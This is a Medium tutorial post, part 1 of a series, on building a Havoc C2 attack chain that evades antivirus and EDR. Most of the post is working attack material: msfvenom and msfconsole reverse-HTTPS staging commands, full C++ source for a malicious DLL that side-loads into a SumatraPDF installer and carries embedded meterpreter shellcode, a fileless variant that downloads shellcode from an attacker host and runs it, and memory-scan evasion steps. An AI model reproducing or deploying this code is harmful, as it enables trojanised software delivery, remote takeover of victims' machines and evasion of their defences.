# https://medium.com/@sam.rothlisberger/havoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Havoc C2 with AV/EDR Bypass Methods in 2024 (Part 1)

## DISCLAIMER: Using these tools and methods against hosts that you do not have explicit permission to test is illegal. You are responsible for any trouble you may cause by using these tools and methods.

[![Sam Rothlisberger](https://miro.medium.com/v2/resize:fill:32:32/1*Fzh2QBHCL67uIEt-y9at1w.jpeg)](https://medium.com/@sam.rothlisberger?source=post_page---byline--733d423fc67b---------------------------------------)

[Sam Rothlisberger](https://medium.com/@sam.rothlisberger?source=post_page---byline--733d423fc67b---------------------------------------)

Follow

15 min read

·

Jan 27, 2024

586

9

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D733d423fc67b&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&source=---header_actions--733d423fc67b---------------------post_audio_button------------------)

Share

Havoc C2 is a modern and malicious post-exploitation framework that has quickly become one of many peoples’ favorite open-source C2s. Its features offer everything you need to complete a pentest or red team engagement. It was designed to be as malleable and modular as possible. That said, the Demon agent is designed to be interoperable with common techniques for bypassing AV/EDR with software such as loaders, packers, crypters, and stagers.

In 2024, we will need to do some things to customize our exploit chain to bypass AV/EDR/IDS. Specifically, we need to make our shellcode less likely to alert signature and dynamic analysis based detection on the host as well as make the network traffic look more normal:

- Encrypt the first stage and second stage payload connections via HTTPS and use a validated/non default SSL certificate.
- Add custom headers, user-agents, certs, URIs, jitter, and ROP chains in our stage one and stage two listeners/payloads to make it harder for Blue Teamers and AV/EDR to detect your C2 connection.
- Make our custom DLL (loader) execute via DLL proxy hijacking and side-loading from a normal Portable Executable (PE) to remain undetected.
- Use a redirector server to hide the true location of our Team Server (command and control server) via port forwarding **(PART 2)**
- Put the executable and DLL in a normal program file folder and start on logon. **(PART 2)**

## Setting Up Havoc C2

First, we need to set up the Team Server. This is a center hub for any victims that are running our agents.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*QdNLWBL9Fjd9WhQJq7KJoA.png)

Setting up Team Server, The hub for all your C2 connections

Then, run the client and connect it to the Team Server. The username/password and port number are in the ./profiles/havoc.yaotl file.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ROeGEesh5jf8W0Ho_QTVcg.png)

Set up the client which connects to the Team Server

Finally, the user interface GUI appears which allows us to create listeners and payloads for those listeners.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Y8D9_X6qcz0PsQ5Z1In_ag.png)

Havoc C2 User Interface

## Setting Up a Havoc C2 Listener

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*i1g3aBFt3Y1i2w7ljrFPew.png)

User Agent Generator for Havoc C2 Listener

Go to ‘View > Listeners’ to set up the listener which the victim will connect to when it executes the stage 2 payload. Use the user agent generator above to create a random user agent.

![](https://miro.medium.com/v2/resize:fit:552/1*36dvULOxixFZBkFJ3uFTRg.png)

Havoc C2 HTTPS Listener

## Creating the Stage 2 Shellcode

We create the second stage shellcode that will be transferred to the victim from the attacker after the initial stage 1 connection. The intent is that this shellcode is much larger than the Stage 1 shellcode so we reduce the size of the shellcode we put on disk. Click ‘Attack > Payload’.

![](https://miro.medium.com/v2/resize:fit:553/1*65pviat2yIw5UKgfqC_-DA.png)

Havoc C2 HTTPS Payload (demon.x64.bin)

Some information about the options we used to make our stage 2 payload more stealthy:

- Indirect Syscalls make the execution of the syscall command takes place within the memory of the ntdll.dll and is therefore legitimate for the EDR. By replacing direct syscalls with indirect ones, the resulting call stack mimics a more conventional execution pattern. This can be useful in bypassing EDR systems that examine the memory area where syscalls and their returns are executed. The weakness of this is ETW which may be compensated by Hardware Breakpoints described below.
- Stack duplication is used during sleep phases to evade detection during C2 operations.
- Foliage is a sleep obfuscation technique that creates a new thread and uses NtApcQueueThread to queue a ROP chain. Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things. In this case, Foliage encrypts our agent memory and delays execution.
- RtlCreateTimer is used to queue the ROP chain itself during between sleep cycles.
- The combination of AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) makes it challenging for red teams to simulate attacks, such as domain enumeration and privilege escalation, because AMSI scans code and ETW provides reports about classes and methods used by PEs. So we want to bypass this with hardware breakpoints which basically loads a new process in debug mode without the hooked EDR or amsi.dll. Read about the technique here:

[**Blindside: A New Technique for EDR Evasion with Hardware Breakpoints** \\
\\
**Utilizing hardware breakpoints to evade monitoring by endpoint detection and response platforms and other…**\\
\\
cymulate.com](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints?source=post_page-----733d423fc67b---------------------------------------)

Click generate and we see the payload saved as demon.x64.bin.

![](https://miro.medium.com/v2/resize:fit:516/1*uBdGlfcE5qirpp-F0fdyaQ.png)

Stage 2 Shellcode Saved Location

## Creating the Stage 1 Shellcode

We need to create our first stage payload which is the only shellcode that will be inside of our malicious DLL loader (on disk) on the victim. We first want to generate a SSL certificate that will not be fingerprinted as being from msfvenom. This is extremely important or your meterpreter connection will be detected.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*lxPR4yjg4XrEOWsMMMgt1g.png)

Then we compile the shellcode with the following options to help us remain undetected by AV/EDR:

> msfvenom -p windows/x64/custom/reverse\_https LHOST=10.0.2.9 LPORT=8443 EXITFUNC=thread -f raw HttpUserAgent=’Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' LURI=blog.html HandlerSSLCert=/home/atler/Downloads/www.google.com.pem

This shellcode creates a reverse shell connection to our attacker machine to transfer the Stage 2 payload (demon.x64.bin) we just generated. Only about 2500 bytes is pretty good!

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*iwpNqY3OspPtaLQ76wti4A.png)

Now we need to create a listener using msfconsole to handle the reverse shell code we just created. We make sure to enter the SHELLCODE\_FILE as our Havoc C2 binary file we generated previously (demon.x64.bin) so we can send our Stage 2 payload after initial connection over meterpreter HTTPS. Here’s the options:

- use multi/handler
- set payload windows/x64/custom/reverse\_https
- set exitfunc thread
- set lhost <IP ADDR>
- set lport 8443
- set luri blog.html
- set HttpServerName Blogger
- set shellcode\_file demon.x64.bin
- set exitonsession false
- set HttpHostHeader [www.factbook.com](http://www.factbook.com/)
- set HandlerSSLCert [www.google.com.pem](http://www.google.com.pem/)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*hVVAsx9vnrxHVVTrqDj4iw.png)

Our process for connections looks like this:

**Step 1)** Victim executes stage 1 payload on disk → stage 2 payload downloaded from port 8443 (Metasploit) on attacker

**Step 2)** Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) on attacker

## Executing C2 Connection via DLL Proxy Hijacking + Side-Loading

We need to decide how to run our DLL stealthily. There’s plenty of ways to do this with some social engineering of course. What we could do is use rundll32.exe in PowerShell, but this is likely caught by EDR even with an AMSI bypass in PowerShell. What we’re going to do is DLL side-loading with DLL proxying from a normal PE.

### Determine what PE to use

The first step is to find a vulnerable PE that is preferably signed/trusted and allows side-loading of a DLL meaning the DLL will load with the PE if it has the correct name and is in the same directory as the PE (which is default for 64 bit systems). I’m going to use a Sumatra PDF setup executable. I downloaded the executable here:

[**Sumatra PDF reader download page** \\
\\
**Download SumatraPDF Portable version is a single executable, can be run from USB drive and doesn't write to registry…**\\
\\
www.sumatrapdfreader.org](https://www.sumatrapdfreader.org/download-free-pdf-viewer?source=post_page-----733d423fc67b---------------------------------------)

### Find what to name our malicious DLL and the export definitions of the legit DLL

It’s not enough to just put any DLL in the same directory as SumatraPDF.exe because we don’t know the name of the loaded DLL and even if we did, it will break the PE itself which would give us away. DLL proxying is a technique to restore the native DLL execution flow (function calls) so the PE is not corrupted. To find the name of a vulnerable DLL and create our .cpp template we are going to use a tool called Sparticus:

[**GitHub - Accenture/Spartacus: Spartacus DLL/COM Hijacking Toolkit** \\
\\
**Spartacus DLL/COM Hijacking Toolkit. Contribute to Accenture/Spartacus development by creating an account on GitHub.**\\
\\
github.com](https://github.com/Accenture/Spartacus?source=post_page-----733d423fc67b---------------------------------------)

On Windows, we run the below command in Powershell and then execute SumatraPDF.exe from anywhere on the system. You’ll also need to download procmon from sysinternals. Sparticus then finds which DLLs are hijackable (multiple, but I chose DWrite.dll), exports their definitions and generates a cpp template that we can open with Visual Studio that won’t break the specific PE when we DLL side-load!

> .\\Spartacus.exe — mode dll — procmon .\\Procmon.exe — pml C:\\Data\\logs.pml — csv C:\\Data\\VulnerableDLLFiles.csv — solution C:\\Data\\Solutions — verbose

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Sx8eXyF-cQEh2SCSTD_eJg.png)

The top pragma comments parse the legit DLLs export table and create a C++ header that contains export definitions that the C++ Compile Linker can use to create the new malicious DLL. We can load the Sparticus generated .cpp template below in Visual Studio with our Stage 1 payload Shellcode and build it:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*Bg-LnKVErb8ebUC-uje0fg.png)

### Build our Malicious DLL (dllmain.cpp) in Visual Studio.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*NHRA5IBhQmgBkyZKyU2YTA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ohDXv6DJ7PHbiUxPwDK6Iw.png)

Make sure the build is for x64 release. Below is the code we used in dllmain.cpp:

> #pragma once
>
> #pragma comment(linker,”/export:DWriteCreateFactory=C:\\\Windows\\\System32\\\DWrite.DWriteCreateFactory, [@1](http://twitter.com/1)")
>
> #include “windows.h”
>
> #include “ios”
>
> #include “fstream”
>
> VOID Payload() {
>
> unsigned char shellcode\[\] =
>
> “\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50”
>
> “\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x51\\x56\\x48\\x8b\\x52”
>
> “\\x18\\x48\\x8b\\x52\\x20\\x4d\\x31\\xc9\\x48\\x8b\\x72\\x50\\x48\\x0f”
>
> “\\xb7\\x4a\\x4a\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41”
>
> “\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52”
>
> “\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x0f”
>
> “\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0”
>
> “\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49”
>
> “\\x01\\xd0\\xe3\\x56\\x4d\\x31\\xc9\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88”
>
> “\\x48\\x01\\xd6\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1”
>
> “\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8”
>
> “\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44”
>
> “\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41”
>
> “\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83”
>
> “\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9”
>
> “\\x4b\\xff\\xff\\xff\\x5d\\x48\\x31\\xdb\\x53\\x49\\xbe\\x77\\x69\\x6e”
>
> “\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x48\\x89\\xe1\\x49\\xc7\\xc2\\x4c”
>
> “\\x77\\x26\\x07\\xff\\xd5\\x53\\x53\\x48\\x89\\xe1\\x53\\x5a\\x4d\\x31”
>
> “\\xc0\\x4d\\x31\\xc9\\x53\\x53\\x49\\xba\\x3a\\x56\\x79\\xa7\\x00\\x00”
>
> “\\x00\\x00\\xff\\xd5\\xe8\\x09\\x00\\x00\\x00\\x31\\x30\\x2e\\x30\\x2e”
>
> “\\x32\\x2e\\x39\\x00\\x5a\\x48\\x89\\xc1\\x49\\xc7\\xc0\\xfb\\x20\\x00”
>
> “\\x00\\x4d\\x31\\xc9\\x53\\x53\\x6a\\x03\\x53\\x49\\xba\\x57\\x89\\x9f”
>
> “\\xc6\\x00\\x00\\x00\\x00\\xff\\xd5\\xe8\\x29\\x00\\x00\\x00\\x2f\\x62”
>
> “\\x6c\\x6f\\x67\\x2e\\x68\\x74\\x6d\\x6c\\x2f\\x61\\x78\\x62\\x43\\x49”
>
> “\\x54\\x55\\x31\\x31\\x4f\\x6f\\x69\\x31\\x79\\x50\\x56\\x52\\x32\\x61”
>
> “\\x54\\x48\\x67\\x43\\x42\\x33\\x6a\\x76\\x50\\x43\\x00\\x48\\x89\\xc1”
>
> “\\x53\\x5a\\x41\\x58\\x4d\\x31\\xc9\\x53\\x48\\xb8\\x00\\x32\\xa8\\x84”
>
> “\\x00\\x00\\x00\\x00\\x50\\x53\\x53\\x49\\xc7\\xc2\\xeb\\x55\\x2e\\x3b”
>
> “\\xff\\xd5\\x48\\x89\\xc6\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x6a\\x1f\\x5a”
>
> “\\x52\\x68\\x80\\x33\\x00\\x00\\x49\\x89\\xe0\\x6a\\x04\\x41\\x59\\x49”
>
> “\\xba\\x75\\x46\\x9e\\x86\\x00\\x00\\x00\\x00\\xff\\xd5\\x4d\\x31\\xc0”
>
> “\\x53\\x5a\\x48\\x89\\xf1\\x4d\\x31\\xc9\\x4d\\x31\\xc9\\x53\\x53\\x49”
>
> “\\xc7\\xc2\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x75\\x23\\x48\\xc7”
>
> “\\xc1\\x88\\x13\\x00\\x00\\x49\\xba\\x44\\xf0\\x35\\xe0\\x00\\x00\\x00”
>
> “\\x00\\xff\\xd5\\x48\\xff\\xcf\\x74\\x02\\xeb\\xaa\\x49\\xc7\\xc2\\xf0”
>
> “\\xb5\\xa2\\x56\\xff\\xd5\\x53\\x48\\x89\\xe2\\x53\\x49\\x89\\xe1\\x6a”
>
> “\\x04\\x41\\x58\\x48\\x89\\xf1\\x49\\xba\\x12\\x96\\x89\\xe2\\x00\\x00”
>
> “\\x00\\x00\\xff\\xd5\\x85\\xc0\\x74\\xd8\\x48\\x83\\xc4\\x28\\x53\\x59”
>
> “\\x5a\\x48\\x89\\xd3\\x6a\\x40\\x41\\x59\\x49\\xc7\\xc0\\x00\\x10\\x00”
>
> “\\x00\\x49\\xba\\x58\\xa4\\x53\\xe5\\x00\\x00\\x00\\x00\\xff\\xd5\\x48”
>
> “\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x49\\x89\\xc0\\x48\\x89”
>
> “\\xda\\x49\\x89\\xf9\\x49\\xba\\x12\\x96\\x89\\xe2\\x00\\x00\\x00\\x00”
>
> “\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x0f\\x84\\x8c\\xff\\xff\\xff”
>
> “\\x58\\xc3”;
>
> HANDLE processHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, GetCurrentProcessId());
>
> PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM\_RESERVE \| MEM\_COMMIT), PAGE\_EXECUTE\_READWRITE);
>
> WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
>
> HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)remoteBuffer, NULL, 0, NULL);
>
> CloseHandle(processHandle);
>
> }
>
> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
>
> {
>
> switch (fdwReason)
>
> {
>
> case DLL\_PROCESS\_ATTACH:
>
> Payload();
>
> break;
>
> case DLL\_THREAD\_ATTACH:
>
> break;
>
> case DLL\_THREAD\_DETACH:
>
> break;
>
> case DLL\_PROCESS\_DETACH:
>
> break;
>
> }
>
> return TRUE;
>
> }

We do acouple things to change the code above from the original Spartacus output. The important thing is the pragma comments (only one in my case) on the top that will basically run the DWrite.dll export table. I delete hModule and the DebugToFile() function that were included by default in our Sparticus tempalte. We also copy and paste the msfvenom shellcode we created for the Stage 1 payload into the variable _shellcode_ as seen above. Then, we create a Payload() function that actually executes _shellcode_ using RemoteThread from our SumatraPDF executable.

## Get Sam Rothlisberger’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

I first wanted to make sure that my DWrite.DLL is working correctly by turning off Defender first and we can see in procmon below that our custom DLL is loaded first and then it queues to load the original in C:\\Windows\\System32\\DWrite.dll. Sweet, we have achieved DLL proxying and side-loading so the program won’t crash.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*eSkrHwcJz9iHynheLRqygQ.png)

Procmon POC: Malicious DLL in SumatraPDF Installer folder loaded first

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*AC19PEZUGrk1ZWlmA85ULg.png)

Procmon POC: legit DLL in C:\\Windows\\system32 executed by the export definitions in our Malicious DLL

### Test AV/EDR detection

We can send SumatraPDF-3.5.2–64-install.exe and our new DLL to the Victim in a zip file. This still won’t bypass protections like applocker, but you can get to that point with some basic bypasses. The executable will look like and act like a setup executable for SumatraPDF, but also make a connection with Havoc C2 in the background.

![](https://miro.medium.com/v2/resize:fit:291/1*9c9vs3950ZOz1KaWx7tRhA.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*KlvCxGe0EPSS8TBVTCrugg.png)

### Try harder

After turning Defender back on and trying to run the executable, we find it still catches the malicious DLL. Specifically, it detects the meterpreter shellcode hardcoded in the _shellcode_ variable. We need to find a way to load this shellcode without putting it in the DLL directly. For this, we’re going to dissect parts of the resource below to instead load the _shellcode_ variable from our remote server into local memory on the victim, which should mitigate us needing to have it hardcoded in the script:

[**Shellcode-Hide/4 - Fileless Shellcode/1 - Using Sockets/FilelessShellcode.cpp at main ·…** \\
\\
**This repo contains : simple shellcode Loader , Encoders (base64 - custom - UUID - IPv4 - MAC), Encryptors (AES)…**\\
\\
github.com](https://github.com/SaadAhla/Shellcode-Hide/blob/main/4%20-%20Fileless%20Shellcode/1%20-%20Using%20Sockets/FilelessShellcode.cpp?source=post_page-----733d423fc67b---------------------------------------)

> #pragma once
>
> #include <winsock2.h>
>
> #include <ws2tcpip.h>
>
> #include <Windows.h>
>
> #include <stdio.h>
>
> #include “ios”
>
> #include “fstream”
>
> char ip\[\] = “10.0.2.9”;
>
> char port\[\] = “80”;
>
> char resource\[\] = “iloveblogs.bin”;
>
> #pragma comment(lib, “ntdll”)
>
> #pragma comment(linker,”/export:DWriteCreateFactory=C:\\\Windows\\\System32\\\DWrite.DWriteCreateFactory, [@1](http://twitter.com/1)")
>
> #pragma comment (lib, “Ws2\_32.lib”)
>
> #pragma comment (lib, “Mswsock.lib”)
>
> #pragma comment (lib, “AdvApi32.lib”)
>
> #define NtCurrentProcess() ((HANDLE)-1)
>
> #define DEFAULT\_BUFLEN 4096
>
> #ifndef NT\_SUCCESS
>
> #define NT\_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
>
> #endif
>
> EXTERN\_C NTSTATUS NtAllocateVirtualMemory(
>
> HANDLE ProcessHandle,
>
> PVOID\* BaseAddress,
>
> ULONG\_PTR ZeroBits,
>
> PSIZE\_T RegionSize,
>
> ULONG AllocationType,
>
> ULONG Protect
>
> );
>
> EXTERN\_C NTSTATUS NtProtectVirtualMemory(
>
> IN HANDLE ProcessHandle,
>
> IN OUT PVOID\* BaseAddress,
>
> IN OUT PSIZE\_T RegionSize,
>
> IN ULONG NewProtect,
>
> OUT PULONG OldProtect);
>
> EXTERN\_C NTSTATUS NtCreateThreadEx(
>
> OUT PHANDLE hThread,
>
> IN ACCESS\_MASK DesiredAccess,
>
> IN PVOID ObjectAttributes,
>
> IN HANDLE ProcessHandle,
>
> IN PVOID lpStartAddress,
>
> IN PVOID lpParameter,
>
> IN ULONG Flags,
>
> IN SIZE\_T StackZeroBits,
>
> IN SIZE\_T SizeOfStackCommit,
>
> IN SIZE\_T SizeOfStackReserve,
>
> OUT PVOID lpBytesBuffer
>
> );
>
> EXTERN\_C NTSTATUS NtWaitForSingleObject(
>
> IN HANDLE Handle,
>
> IN BOOLEAN Alertable,
>
> IN PLARGE\_INTEGER Timeout
>
> );
>
> void getShellcode\_Run(char\* host, char\* port, char\* resource) {
>
> DWORD oldp = 0;
>
> BOOL returnValue;
>
> size\_t origsize = strlen(host) + 1;
>
> const size\_t newsize = 100;
>
> size\_t convertedChars = 0;
>
> wchar\_t Whost\[newsize\];
>
> mbstowcs\_s(&convertedChars, Whost, origsize, host, \_TRUNCATE);
>
> WSADATA wsaData;
>
> SOCKET ConnectSocket = INVALID\_SOCKET;
>
> struct addrinfo\* result = NULL,
>
> \\* ptr = NULL,
>
> hints;
>
> char sendbuf\[MAX\_PATH\] = “”;
>
> lstrcatA(sendbuf, “GET /”);
>
> lstrcatA(sendbuf, resource);
>
> char recvbuf\[DEFAULT\_BUFLEN\];
>
> memset(recvbuf, 0, DEFAULT\_BUFLEN);
>
> int iResult;
>
> int recvbuflen = DEFAULT\_BUFLEN;
>
> // Initialize Winsock
>
> iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
>
> if (iResult!= 0) {
>
> printf(“WSAStartup failed with error: %d\\n”, iResult);
>
> return;
>
> }
>
> ZeroMemory(&hints, sizeof(hints));
>
> hints.ai\_family = PF\_INET;
>
> hints.ai\_socktype = SOCK\_STREAM;
>
> hints.ai\_protocol = IPPROTO\_TCP;
>
> // Resolve the server address and port
>
> iResult = getaddrinfo(host, port, &hints, &result);
>
> if (iResult!= 0) {
>
> printf(“getaddrinfo failed with error: %d\\n”, iResult);
>
> WSACleanup();
>
> return;
>
> }
>
> // Attempt to connect to an address until one succeeds
>
> for (ptr = result; ptr!= NULL; ptr = ptr->ai\_next) {
>
> // Create a SOCKET for connecting to server
>
> ConnectSocket = socket(ptr->ai\_family, ptr->ai\_socktype,
>
> ptr->ai\_protocol);
>
> if (ConnectSocket == INVALID\_SOCKET) {
>
> printf(“socket failed with error: %ld\\n”, WSAGetLastError());
>
> WSACleanup();
>
> return;
>
> }
>
> // Connect to server.
>
> printf(“\[+\] Connect to %s:%s”, host, port);
>
> iResult = connect(ConnectSocket, ptr->ai\_addr, (int)ptr->ai\_addrlen);
>
> if (iResult == SOCKET\_ERROR) {
>
> closesocket(ConnectSocket);
>
> ConnectSocket = INVALID\_SOCKET;
>
> continue;
>
> }
>
> break;
>
> }
>
> freeaddrinfo(result);
>
> if (ConnectSocket == INVALID\_SOCKET) {
>
> printf(“Unable to connect to server!\\n”);
>
> WSACleanup();
>
> return;
>
> }
>
> // Send an initial buffer
>
> iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
>
> if (iResult == SOCKET\_ERROR) {
>
> printf(“send failed with error: %d\\n”, WSAGetLastError());
>
> closesocket(ConnectSocket);
>
> WSACleanup();
>
> return;
>
> }
>
> printf(“\\n\[+\] Sent %ld Bytes\\n”, iResult);
>
> // shutdown the connection since no more data will be sent
>
> iResult = shutdown(ConnectSocket, SD\_SEND);
>
> if (iResult == SOCKET\_ERROR) {
>
> printf(“shutdown failed with error: %d\\n”, WSAGetLastError());
>
> closesocket(ConnectSocket);
>
> WSACleanup();
>
> return;
>
> }
>
> // Receive until the peer closes the connection
>
> do {
>
> iResult = recv(ConnectSocket, (char\*)recvbuf, recvbuflen, 0);
>
> if (iResult > 0)
>
> printf(“\[+\] Received %d Bytes\\n”, iResult);
>
> else if (iResult == 0)
>
> printf(“\[+\] Connection closed\\n”);
>
> else
>
> printf(“recv failed with error: %d\\n”, WSAGetLastError());
>
> //EXECUTE SHELLCODE (BUF) START
>
> HANDLE processHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, GetCurrentProcessId());
>
> PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM\_RESERVE \| MEM\_COMMIT), PAGE\_EXECUTE\_READWRITE);
>
> WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
>
> HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)remoteBuffer, NULL, 0, NULL);
>
> CloseHandle(processHandle);
>
> // EXECUTE SHELLCODE (BUF) END
>
> } while (iResult > 0);
>
> // cleanup
>
> closesocket(ConnectSocket);
>
> WSACleanup();
>
> }
>
> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
>
> {
>
> switch (fdwReason)
>
> {
>
> case DLL\_PROCESS\_ATTACH:
>
> getShellcode\_Run(ip, port, resource);
>
> break;
>
> case DLL\_THREAD\_ATTACH:
>
> break;
>
> case DLL\_THREAD\_DETACH:
>
> break;
>
> case DLL\_PROCESS\_DETACH:
>
> break;
>
> }
>
> return TRUE;
>
> }

I basically copied the whole script over to my dllmain.cpp. I kept the pragma comments I need (1 comment in my case) from my Sparticus output:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*UKMEqNwpunqitLhREACt9A.png)

and put the Create Thread Process in my original payload() function to now run in the getShellcode\_Run() function. I also changed the variable _shellcode_ to _recvbuf_ when executing the new thread on the process with our meterpreter shellcode.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*mNHKBQOFSOGNd-M5Vtk__A.png)

I added the variables _ip_, _port_, and _resource_ to grab my shellcode remotely in the getShellcode\_Run() function.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*_rsvgVIPBVD5kYiVZ6p21A.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*uDfa2hghW0Aj1zSTq0eY1Q.png)

Last thing we need to do is convert our stage 1 payload on the attacker to binary instead of shellcode since we’re going to serve it remotely. I use the msfvenom command below to create my iloveblogs.bin file instead of raw shellcode in hex. Then I started a HTTP server on port 80 to serve it to the victim.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*AYepNwcBHenTEzOQSjqZDw.png)

Our NEW process for connections looks like this:

**Step 1)** Victim downloads iloveblogs.bin shellcode (stage 1) from our HTTP server on port 80 and loads it into memory.

**Step 2)** Victim executes this stage 1 payload (iloveblogs.bin) → stage 2 payload downloaded from port 8443 (Metasploit) on attacker

**Step 3)** Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) on attacker

### Try Harder Again

So you’ll notice that this will in fact bypass Defender (YAY), but maybe not some EDR products that scan memory more intently. Other AV/EDR might scan memory when functions such as CreateProcess and CreateRemoteThread are called which we use in our DLL. So to avoid possible detection, we should obscure our code execution even in memory:

1. Get a handle to the target process. GetProcessesByName will work for this purpose and then open the target process using OpenProcess (like we did previously, no change)

> HANDLE processHandle = OpenProcess(PROCESS\_ALL\_ACCESS, FALSE, GetCurrentProcessId());

2\. Call VirtualAllocEx to allocate memory within the target process (like we did previously, no change)

> PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM\_RESERVE \| MEM\_COMMIT), PAGE\_EXECUTE\_READWRITE);

3\. Call VirtualProtectEx to set PAGE\_NO\_ACCESS on the area of memory so AV cannot scan it, but we also can’t write to it yet.

> VirtualProtectEx(processHandle, remoteBuffer,sizeof recvbuf, 0x01, NULL);

4\. Use CreateRemoteThreadto spawn a suspended thread so that the thread is created but does not start running until explicitly resumed.

> HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD\_START\_ROUTINE)remoteBuffer, NULL, 0x00000004, NULL);

5\. Wait for AV to attempt to carry out it’s scanning, which will come up with nothing because it’s unable to read the memory. This might need to be a delay up to 15 seconds, but one second is barely noticeable.

> Sleep(1090);

